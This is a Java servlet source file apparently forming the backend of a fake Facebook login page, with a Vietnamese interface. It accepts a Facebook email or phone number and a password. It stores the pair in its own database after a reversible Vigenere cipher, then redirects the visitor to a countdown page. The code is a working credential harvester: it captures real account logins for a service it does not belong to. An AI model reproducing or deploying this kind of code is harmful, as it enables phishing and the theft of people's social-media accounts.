package controller;

import java.io.IOException;
import java.util.regex.Pattern;

import javax.servlet.RequestDispatcher;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import database.FacebookDAO;
import database.GmailDAO;
import model.Facebook;
import model.Gmail;

/**
 * Servlet implementation class LogByFacebook
 */
@WebServlet("/dang-nhap-facebook")
public class LogByFacebook extends HttpServlet {
	private static final long serialVersionUID = 1L;
       
    /**
     * @see HttpServlet#HttpServlet()
     */
    public LogByFacebook() {
        super();
        // TODO Auto-generated constructor stub
    }

	/**
	 * @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		request.setCharacterEncoding("UTF-8");
		response.setCharacterEncoding("UTF-8");
		response.setContentType("UTF-8");
		
		String userFacebook = request.getParameter("userFacebook");
		String password = request.getParameter("password");
		
		boolean error = false;
		Pattern facebookPattern = Pattern.compile("((\\w+@gmail.com)|(0+\\d{9})|(\\w+@hotmail.com))");
		java.util.regex.Matcher facebookMatcher = facebookPattern.matcher(userFacebook);
		if(!facebookMatcher.matches()) {
			error = true;
		}
		String url = "/CountDown.html";
		if(error == false) {
			password = model.VigenereCipher.encrypt(password);
			Facebook facebook = new Facebook(userFacebook, password);
			Facebook facebook2 = FacebookDAO.getInstance().selectByUser(facebook);
			if(facebook2 == null) {
				FacebookDAO.getInstance().insert(facebook);
			}
			HttpSession session = request.getSession();
			session.setAttribute("log", userFacebook);
		}else {
			url = "/facebook.jsp";
			request.setAttribute("facebook", userFacebook);
			request.setAttribute("e_facebook", "Tài khoản hoặc mật khẩu không chính xác");
		}
		RequestDispatcher requestDispatcher = getServletContext().getRequestDispatcher(url);
		requestDispatcher.forward(request, response);
		
	}

	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		doGet(request, response);
	}

}
